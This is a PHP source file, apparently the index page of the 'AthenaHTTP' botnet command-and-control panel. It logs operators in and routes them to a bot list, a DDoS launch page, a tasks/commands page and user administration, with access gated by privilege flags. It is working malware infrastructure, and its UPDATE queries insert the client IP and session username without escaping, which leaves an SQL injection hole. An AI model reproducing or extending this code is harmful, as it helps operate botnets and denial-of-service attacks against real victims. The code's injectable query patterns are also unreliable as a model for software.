<?php

	error_reporting(E_ERROR | E_PARSE);
	
	define('AthenaHTTP', '');
	require_once './config.php';
	
	session_start();
	
	$LOGIN = false;
	
	if($_SESSION['username'] && $_SESSION['password'])
	{	
		$result = mysql_query('SELECT password FROM users WHERE username = \'' . mysql_real_escape_string(trim($_SESSION['username'])) . '\' LIMIT 1;');
		if($result)
		{
			$row = mysql_fetch_array($result);
			
			if($row['password'] == trim($_SESSION['password']))
				$LOGIN = true;
			else 
				session_unset();
		}
		else session_unset();
	}
	else if($_POST['username'] && $_POST['password'])
	{	
		$result = mysql_query('SELECT password FROM users WHERE username = \'' . mysql_real_escape_string(trim($_POST['username'])) . '\' LIMIT 1;');
		
		if($result)
		{
			$row = mysql_fetch_array($result);
			if($row['password'] == hash('sha512', trim($_POST['password']) . '|' . trim($_POST['password'])))
			{
				$_SESSION['username'] = trim($_POST['username']);
				$_SESSION['password'] = hash('sha512', trim($_POST['password']) . '|' . trim($_POST['password']));
				$LOGIN = true;
			}
			else session_unset();
		}
		else session_unset();
	}
	
	if($LOGIN)
	{
		mysql_query('UPDATE users SET `lastip` = \'' . $_SERVER['REMOTE_ADDR'] . '\' WHERE username = \'' . $_SESSION['username'] . '\';');	//update users latest IP
		mysql_query('UPDATE users SET `lastseen` = \'' . $TIME . '\' WHERE username = \'' . $_SESSION['username'] . '\';');	//update users latest usage time
		
		$USERINFO = mysql_fetch_array(mysql_query('SELECT * FROM users WHERE username = \'' . mysql_real_escape_string(trim($_SESSION['username'])) . '\' LIMIT 1;'));
		
		$config_loginpagekey = mysql_fetch_array(mysql_query('SELECT `key` FROM config WHERE value = \'loginpagekey\';'));
		$config_loginpagekey_enabled = mysql_fetch_array(mysql_query('SELECT data FROM config WHERE value = \'loginpagekey\';'));
		
		$config_online = mysql_fetch_array(mysql_query('SELECT data FROM config WHERE value = \'knock\';'));
		$config_dead = mysql_fetch_array(mysql_query('SELECT data FROM config WHERE value = \'dead\';'));
		
		define('ONLINE', $config_online['data']);
		define('DEAD', $config_dead['data']);
	
		$HEAD_USER = $USERINFO['username'];
		
		switch($_GET['p'])
		{
			case 'botlist':
				$ARROW_BOTLIST = '<p></p>';
				require_once './include/tpl_botlist.php';
				break;
				
			case 'ddos':
				if($USERINFO['priv2'] || $USERINFO['admin'])
				{
					$ARROW_DDOS = '<p></p>';
					require_once './include/tpl_ddos.php';
				}
				else
				{
					$ARROW_BOTLIST = '<p></p>';
					require_once './include/tpl_botlist.php';
				}
				break;
				
			case 'checker':
				$ARROW_CHECKER = '<p></p>';
				require_once './include/tpl_webchecker.php';
				break;
				
			case 'misc':
				if($USERINFO['priv1'] || $USERINFO['priv2'] || $USERINFO['priv3'] || $USERINFO['priv4'] || $USERINFO['admin'])
				{
					$ARROW_MISC = '<p></p>';
					require_once './include/tpl_misc.php';
				}
				else
				{
					$ARROW_BOTLIST = '<p></p>';
					require_once './include/tpl_botlist.php';
				}
				break;
				
			case 'tasks':
				$ARROW_TASKS = '<p></p>';
				require_once './include/tpl_activecommands.php';
				break;
			
			case 'userlist':
				if($USERINFO['admin'])
				{
					$ARROW_USERLIST = '<p></p>';
					require_once './include/tpl_userlist.php';
				}
				else
				{
					$ARROW_BOTLIST = '<p></p>';
					require_once './include/tpl_botlist.php';
				}
				break;
				
			case 'prefs':
				$ARROW_PREFS = '<p></p>';
				require_once './include/tpl_prefs.php';
				break;
				
			case 'help':
				require_once './include/tpl_help.php';
				break;
			
			case 'logout':
				session_unset();
				header('Location: ./login');
				break;
				
			default: 
				$ARROW_BOTLIST = '<p></p>';
				require_once './include/tpl_botlist.php';
				break;
		}
		
		require_once './include/tpl_main.php';	
		print $PAGE;
	}
	/*else
	{
		require_once './include/tpl_login.php';
		print $PAGE;
	}*/
?>